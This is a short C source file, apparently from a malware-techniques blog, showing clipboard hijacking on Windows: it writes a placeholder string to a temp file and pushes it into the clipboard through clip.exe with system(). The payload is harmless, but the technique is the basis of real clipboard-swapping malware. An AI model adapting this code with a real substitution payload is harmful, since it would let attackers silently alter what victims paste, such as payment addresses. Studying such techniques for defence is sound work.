/*
 * hack3.c
 * simple clipboard hijacking
 * using clip.exe to manipulate clipboard content
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/05/10/malware-tricks-47.html
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void hijackClip() {
  // prepare the data to be placed in the clipboard
  const char *maliciousData = "Meow-meow!!";  // the text we want to copy to the clipboard

  // create a temporary file to store the malicious data
  FILE *tmpFile = fopen("meow_data.txt", "w");
  if (tmpFile == NULL) {
    printf("failed to create temporary file.\n");
    return;
  }

  // write the malicious data to the file
  fprintf(tmpFile, "%s", maliciousData);
  fclose(tmpFile);

  // use `clip.exe` to copy the content of the temporary file to the clipboard
  char command[256];
  snprintf(command, sizeof(command), "clip < meow_data.txt");

  // execute the command
  system(command);

  // clean up: delete the temporary file
  remove("meow_data.txt");

  printf("clipboard hijacked! data copied to clipboard: %s\n", maliciousData);
}

int main() {
  printf("starting clipboard hijack using clip.exe...\n");

  // hijack the clipboard with malicious data
  hijackClip();

  return 0;
}
